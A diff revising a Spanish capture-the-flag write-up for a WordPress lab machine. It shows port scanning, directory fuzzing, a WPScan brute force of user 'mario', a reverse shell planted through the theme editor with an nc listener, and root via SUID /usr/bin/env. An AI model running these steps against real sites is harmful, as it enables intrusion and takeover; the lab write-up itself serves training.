@@ -7,9 +7,11 @@ img_path: /assets/img/dck/walking_cms/
 image: /assets/img/dck/walking_cms/walking_cms.png
 ---
 
-## Reconocimiento
+Explotamos una vulnerabilidad en WordPress para cargar una Reverse Shell a través del editor de temas. Con esta shell, obtuvimos acceso a la máquina objetivo. Luego, buscamos binarios SUID y utilizamos `/usr/bin/env` para escalar privilegios, obteniendo acceso root.
 
-Empezamos realizando un escaneo a la máquina objetivo con nmap, para ver que puertos tiene abiertos.
+## Reconocimiento
+---
+Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios activos.
 
 ```bash
 nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
@@ -17,9 +19,8 @@ _______________________________________________________________________
 PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
 ```
-
 ---
-Tiene abierto el puerto 80, ahora procedemos a lanzar un conjunto de script básicos  y a verificar su versión.
+Se identificó el puerto **80 (HTTP)** como abierto. A continuación, ejecutamos un escaneo más detallado para obtener información sobre los servicios y sus versiones.
 
 ```bash
 nmap -sCV -p80 172.17.0.2 -oN targeted
@@ -29,11 +30,9 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.57 (Debian)
 |_http-title: Apache2 Debian Default Page: It works
 ```
-
 ## Enumeración
-
 ---
-Está corriendo el servicio de Apache, y no vemos nada más que sea relevante. Así que aplicaremos Fuzzing con Gobuster para descubrir directorios y archivos.
+El servicio HTTP está ejecutando Apache, y no se detectan otras aplicaciones relevantes en el escaneo inicial. Procedemos a realizar un fuzzing de directorios y archivos usando `Gobuster`.
 
 ```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,txt,sh
@@ -43,12 +42,13 @@ _______________________________________________________________________
 /server-status        (Status: 403) [Size: 275]
 ```
 ---
-Gobuster nos reporto el directorio /wordpress, así que entramos a la página y de primera vista no notamos nada interesante.
+`Gobuster` revela el directorio `/wordpress`, que exploramos sin encontrar información destacable al principio.
 
 ![walking_cms-1](/assets/img/dck/walking_cms/walking_cms-1.png)
 
 ---
-Como se trata de un WordPress, utilizaremos WPScan para enumerar usuarios válidos y plugins instalados junto con sus versiones.
+Dado que el sitio está basado en WordPress, utilizamos `WPScan` para enumerar usuarios y plugins.
+
 ```bash
 wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp 
 _______________________________________________________________________
@@ -61,11 +61,9 @@ _______________________________________________________________________
  |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 ```
-
 ## Explotación
-
 ---
-Nos encontró al usuario mario, y podemos aprovechar la herramienta de WPScan para realizar un ataque de fuerza bruta.
+`WPScan` identifica el usuario **mario**, y utilizamos la misma herramienta para realizar un ataque de fuerza bruta con el diccionario `rockyou.txt`.
 
 ```bash
 wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
@@ -78,7 +76,7 @@ Trying mario / badboy Time: 00:00:04 <
  | Username: mario, Password: love
 ```
 ---
-Obtenemos la contraseña del usuario mario, pero debemos conocer el panel de login, así que volvemos a hacer fuzzing con gobuster al directorio de wordpress.
+Obtenemos la contraseña del usuario **mario**. Para acceder al panel de administración de WordPress, realizamos otro escaneo con `Gobuster` para encontrar el archivo de login.
 
 ```bash
 gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html
@@ -92,37 +90,36 @@ _______________________________________________________________________
 /wp-signup.php        (Status: 302) [Size: 0]
 ```
 ---
-Nos dirigimos a la página web, en el directorio /wordpress/wp-admin y utilizamos las credenciales para loguearnos.
+Accedemos a la página de login en `/wordpress/wp-login.php` e iniciamos sesión con las credenciales obtenidas.
 
 ![walking_cms-2](/assets/img/dck/walking_cms/walking_cms-2.png)
 
 ---
-Tenemos acceso al panel de wordpress como administrador, así que nos dirigimos a Theme Editor para modificar el index.php.
+Con acceso al panel de administración de WordPress, modificamos el archivo `index.php` a través del Theme Editor para insertar una Reverse Shell en PHP.
 
 ![walking_cms-3](/assets/img/dck/walking_cms/walking_cms-3.png)
 
 ---
-Reemplazamos todo lo que aparece, por una Reverse Shell en PHP de Pentestmonkey, especificando nuestra IP de atacante y el puerto. Y le damos a Update File.
+Reemplazamos todo lo que aparece, por una Reverse Shell en PHP proporcionada por [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), especificando nuestra IP de atacante y el puerto. Luego damos a Update File.
 
 ![walking_cms-4](/assets/img/dck/walking_cms/walking_cms-4.png)
 
 ---
-Nos ponemos en escucha en el puerto 443, ya que ese fue el puerto que especificamos.
+Configuramos `netcat` para escuchar en el puerto 443, que fue el especificado en la Reverse Shell.
 
 ```bash
 nc -lvnp 443
 _______________________________________________________________________
 listening on [any] 443 ...
 ```
-
-Luego nos dirigimos al navegador y entramos a esta página donde fue que modificamos para tener una Reverse Shell.
+---
+Accedemos al archivo modificado en el navegador para recibir la Reverse Shell.
 
 ```css
 http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
 ```
-
 ---
-Logramos obtener acceso a la máquina objetivo.
+Conseguimos acceso a la máquina objetivo.
 
 ```bash
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45834
@@ -133,8 +130,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 _______________________________________________________________________
 www-data@48e833747d49:/$
 ```
-
-Ahora haremos un Tratamiento de la TTY para poder trabajar cómodamente por la consola.
+---
+Procedemos a realizar un tratamiento de la TTY para una mejor experiencia en la consola.
 
 ```bash
 script /dev/null -c bash
@@ -145,11 +142,9 @@ export TERM=xterm
 export SHELL=bash
 stty rows 41 columns 183
 ```
-
 ## Escalada de Privilegios
-
 ---
-Ahora si vamos con la escalada de privilegios. Buscamos binarios con permisos SUID.
+Para escalar privilegios, buscamos binarios con permisos SUID.
 
 ```bash
 www-data@48e833747d49:/$ find / -perm -4000 2>/dev/null | xargs ls -l
@@ -164,9 +159,8 @@ _______________________________________________________________________
 -rwsr-xr-x 1 root root 72000 Mar 23  2023 /usr/bin/su
 -rwsr-xr-x 1 root root 35128 Mar 23  2023 /usr/bin/umount
 ```
-
 ---
-Vemos que el binario /usr/bin/env tiene permisos SUID, y podemos utilizarlo con ayuda de GTFOBins para obtener una shell como root y logramos terminar la máquina.
+El binario `/usr/bin/env` tiene permisos SUID. Usando [GTFOBins](https://gtfobins.github.io/gtfobins/env/), ejecutamos este binario para obtener una shell con privilegios de root.
 
 ```bash
 www-data@48e833747d49:/$ ./usr/bin/env /bin/bash -p
